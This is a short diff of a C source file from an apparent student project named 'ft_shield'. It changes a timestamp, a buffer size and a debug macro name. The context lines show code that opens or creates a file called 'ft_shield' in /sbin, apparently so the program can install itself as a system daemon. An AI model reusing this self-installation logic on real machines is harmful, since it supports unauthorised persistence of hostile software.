@@ -6,7 +6,7 @@
 /*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/03/23 02:22:51 by kiroussa          #+#    #+#             */
-/*   Updated: 2025/03/23 03:50:44 by kiroussa         ###   ########.fr       */
+/*   Updated: 2025/03/25 14:22:00 by kiroussa         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -19,7 +19,7 @@
 #include <unistd.h>
 
 #define TARGET_FILE_NAME "ft_shield"
-#define BUFFER_SIZE 8192
+#define BUFFER_SIZE 65536
 
 static inline bool	shield_directory_exists(const char *dir)
 {
@@ -34,7 +34,7 @@ static inline bool	shield_directory_exists(const char *dir)
 
 static inline int	shield_find_target(void)
 {
-	if (DEBUG)
+	if (SHIELD_DEBUG)
 		return (open("daemon_" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644));
 	if (shield_directory_exists("/sbin"))
 		return (open("/sbin/" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644));
